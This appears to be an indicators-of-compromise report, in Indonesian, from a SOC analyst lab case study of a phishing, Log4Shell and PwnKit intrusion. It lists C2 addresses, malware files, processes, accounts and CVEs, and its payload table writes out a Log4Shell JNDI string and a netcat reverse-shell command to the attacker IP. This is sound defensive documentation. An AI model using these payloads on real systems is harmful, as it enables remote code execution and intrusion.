[indicators.md](https://github.com/user-attachments/files/27854041/indicators.md)
# 📌 Indicators of Compromise (IoC)
## Studi Kasus: Cyber Threat Analysis – SOC Analyst

---

## Network IoC

| Type | Value | Port | Keterangan |
|---|---|---|---|
| IP Address (C2) | `192.168.1.10` | 443 | Command & Control server attacker |
| IP Address (C2) | `192.168.1.10` | 9999 | Reverse shell listener |
| IP Address (C2) | `192.168.1.10` | 1389 | LDAP server untuk Log4Shell |
| IP Address (Victim) | `192.168.10.10` | - | Host Windows korban pertama |
| IP Address (Lateral) | `192.168.10.30` | 22 | Host Ubuntu target lateral movement |

---

## File IoC

| Filename | Hash / Size | Keterangan |
|---|---|---|
| `Acount_details.pdf.exe` | - | Malware awal (double extension) |
| `mCblHDgWP.dll` | 8704 bytes | Malicious DLL injected |
| `ModuleAnalysisCache` | - | File yang di-overwrite PowerShell |
| `CVE-2021-4034.py` | - | Python exploit PwnKit |
| `payload.so` | - | Shared library exploit |
| `exploit` | - | Binary exploit PwnKit |
| `gconv-modules` | - | Library untuk gconv hijack |

---

## Process IoC

| Process | PID | Keterangan |
|---|---|---|
| `msedge.exe` | - | Digunakan untuk download malware |
| `Acount_details.pdf.exe` | - | Malware execution |
| `rundll32.exe` | 8856 | Parent process spawn cmd.exe |
| `cmd.exe` | 10716 | Dijalankan dengan NT AUTHORITY |
| `powershell.exe` | 8836 | Overwrite ModuleAnalysisCache |
| `powershell.exe` | 11676 | Create .PS1 files |
| `python3` | 3003 | Jalankan exploit CVE-2021-4034 |
| `pkexec` | 3003 | Privilege escalation via PwnKit |
| `bash` | 3011 | Interactive shell setelah root |
| `nc` / `netcat` | 3075 | Reverse shell ke attacker |
| `java` | - | Parent process netcat (Apache Solr) |

---

## Registry IoC

| Registry Path | Value | Keterangan |
|---|---|---|
| `HKLM\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy\Enabled` | Modified | Menonaktifkan standar enkripsi FIPS 140 |

---

## Credential IoC

| Username | Host | Keterangan |
|---|---|---|
| `ahmed` | DESKTOP-Q1SL9P2 | User pertama yang menjalankan malware |
| `cybery` | DESKTOP-Q1SL9P2 | User privilege tinggi yang juga menjalankan malware |
| `salem` | 192.168.10.30 (Ubuntu) | Akun yang berhasil di-brute force via SSH |
| `solr` | CentOS | User yang menjalankan netcat (Apache Solr service user) |

---

## Exploit & CVE

| CVE | CVSS | Exploit | Target |
|---|---|---|---|
| CVE-2021-44228 | 10.0 (CRITICAL) | Log4Shell — JNDI Injection | Apache Solr (Java Log4j 2.0–2.14.1) |
| CVE-2021-4034 | 7.8 (HIGH) | PwnKit — pkexec LPE | polkit/pkexec di Linux |

---

## Payload IoC

| Type | Payload | Keterangan |
|---|---|---|
| Log4Shell JNDI | `${jndi:ldap://192.168.1.10:1389/Exploit}` | Payload Log4J untuk trigger RCE |
| GET Parameter | `foo` | Parameter yang rentan di `/admin/cores` |
| Reverse Shell | `nc -e /bin/bash 192.168.1.10 9999` | Perintah reverse shell ke attacker |
| Interactive Shell | `bash -i` | Perintah interactive shell setelah root |

---

## Vulnerable Asset

| Asset | OS | Service | CVE |
|---|---|---|---|
| DESKTOP-Q1SL9P2 | Windows | - | Endpoint phishing victim |
| 192.168.10.30 | Ubuntu | SSH (port 22) | Brute force victim |
| CentOS (hostname: CentOS) | CentOS | Apache Solr | CVE-2021-44228 |

---

*Semua IoC ini bersumber dari hasil investigasi SIEM Elastic pada environment lab.*
